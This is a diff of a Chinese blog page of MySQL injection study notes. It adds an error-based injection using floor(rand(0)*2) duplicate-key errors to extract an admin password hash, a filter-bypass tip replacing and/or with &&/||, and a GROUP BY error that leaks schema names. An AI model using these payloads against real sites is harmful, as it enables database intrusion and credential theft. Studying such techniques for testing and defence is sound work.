@@ -99,7 +99,7 @@
 <meta property="og:url" content="https://someonesometimes.github.io/2017/07/23/mysql注入学习（持续更新中）/index.html">
 <meta property="og:site_name" content="Yiruma">
 <meta property="og:description" content="目前排版还比较乱，常见的姿势基本已经整理的比较全了，还在不断学习中。。。">
-<meta property="og:updated_time" content="2017-12-19T07:57:17.016Z">
+<meta property="og:updated_time" content="2017-12-20T05:37:04.612Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="mysql注入学习（持续保持更新）">
 <meta name="twitter:description" content="目前排版还比较乱，常见的姿势基本已经整理的比较全了，还在不断学习中。。。">
@@ -423,8 +423,11 @@
 <p><code>extractvalue()</code>函数是mysql中用来查询xml信息的函数</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">有时候可能爆不全，不全的时候用limit offset按行取吧</div><div class="line">有时候还容易出问题，尝试使用第二行的写法，将计算结果左右连接上~</div><div class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>),<span class="number">1</span>);</div><div class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>),<span class="number">0x7e</span>));</div><div class="line">output:</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: '~dd9d15d993d6f42f896ab4ba09a6a69</div></pre></td></tr></table></figure>
 <p><strong>基于主键重复的报错</strong></p>
-<p>报错原因网上有比较详细的分析，涉及到mysql执行这条语句时候的具体过程，需要的时候可以再去学习</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select count(*),concat((select group_concat(password) from user),floor(rand(0)*2))x from information_schema.tables group by x;</div><div class="line">output:</div><div class="line">ERROR 1062 (23000): Duplicate entry 'dd9d15d993d6f42f896ab4ba09a6a695,56057a4f4e475d73e48824acf8b5409' for key '&lt;group_key&gt;'</div></pre></td></tr></table></figure>
+<p>是目前网上报错注入流传比较多的版本，好处是在高版本中依旧可以爆出错误，同时也没有使用updatexml函数报错限制报错长度为32的弊端</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from user where username='14' or (select count(*) from information_schema.tables group by concat(floor(rand(0)*2),(select password from user where username='admin')));</div><div class="line">output:</div><div class="line">ERROR 1062 (23000): Duplicate entry '16b9412ec641f16892544154952fc8b1d' for key '&lt;group_key&gt;'</div><div class="line">注意第一个数字1是要去掉的，为floor(rand(0)*2)的结果</div></pre></td></tr></table></figure>
+<p>原理分析：</p>
+<p>在一条语句<code>select count(*) from user group by username</code>中，数据库的操作是建立一个虚表，比起原表多了一个count()列，group by的那个列变成了主键也就是<code>&lt;group_key&gt;</code>，之后从user表中一条条的取出来数据，在虚表中查找，基于group_key（在这里就是username）的值在虚表中是否已经存在，来决定是在count()列中加1还是新添加一个列。  考虑这个过程，我们使用<code>floor(rand(0)*2)</code>作为<code>&lt;group_key&gt;</code>的话，我们每次从user表里面提出来一条数据准备依据group_key进行插入，第一次计算结果是0，group_key为0，第二次是1，group_key为0，这里都没问题，只是在虚表中多了两个列，一个列名1，一个列名0，第三次插入的时候计算结果为1，这时再准备往虚表中插入虚拟的主键1，就会报主键重复的错误。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Duplicate entry '16b9412ec641f16892544154952fc8b1d' for key '&lt;group_key&gt;'</div></pre></td></tr></table></figure>
 <h2 id="sql过滤统计"><a href="#sql过滤统计" class="headerlink" title="sql过滤统计"></a>sql过滤统计</h2><p>反正过滤吧，不是想办法绕过，就是再找一个相同功能的写法来替换<br>先放上一些比较经典的：</p>
 <ul>
 <li><a href="https://xianzhi.aliyun.com/forum/read/349.html" target="_blank" rel="external">我的WafBypass之道</a></li>
@@ -440,6 +443,7 @@
 <li>sqlmap中space2hash.py的方法，用%23xxx%0a来做空格</li>
 <li>使用<code>/**/</code>来做分隔</li>
 <li>使用%0a来做分隔</li>
+<li>and可以用&amp;&amp;代替 or可以用||代替  这样不仅不需要空格，连and or都不需要</li>
 </ul>
 <p><strong>过滤某些sql语句的关键字</strong></p>
 <ul>
@@ -481,6 +485,9 @@
 <p>实际上数据库名并不是必须要拿的，主要是只能拿当前库的名字，而写sql的时候又没必要加上当前库的名字。。。</p>
 <p>在后面可以看到，拿表名列名什么的时候，也都可以顺便把数据库名爆出来</p>
 <h4 id="然后是拿表名"><a href="#然后是拿表名" class="headerlink" title="然后是拿表名"></a>然后是拿表名</h4><p>注意，拿表名需要至少猜测到一个表中存在的字段名</p>
+<p>在测试基于主键的报错时无意中发现了这么一个报错</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from user group by 1 and 1;</div><div class="line">ERROR 1055 (42000): Expression #1 of SELECT list is not in GROUP BY clause and contains nonaggregated column 'blog.user.username' which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by</div></pre></td></tr></table></figure>
+<p>有趣的是这里将数据库名，表名，表中的第一个字段名都爆了出来。这一点会对我们接下来的工作有帮助。</p>
 <p>看到网上通用的做法是利用函数Polygon的报错实现</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from user where username=Polygon(username);</div><div class="line">ERROR 1367 (22007): Illegal non geometric '`blog`.`user`.`username`' value found during parsing</div></pre></td></tr></table></figure>
 <p>原理其实就是将字段名作为报错函数的参数，这样在报错时可能就会将字段的详细信息爆出来，所以之前介绍的那些报错函数大都是可用的</p>
@@ -717,7 +724,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">24</span>
+                <span class="site-state-item-count">25</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -786,7 +793,7 @@
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2017</span>
+  <span itemprop="copyrightYear">2018</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
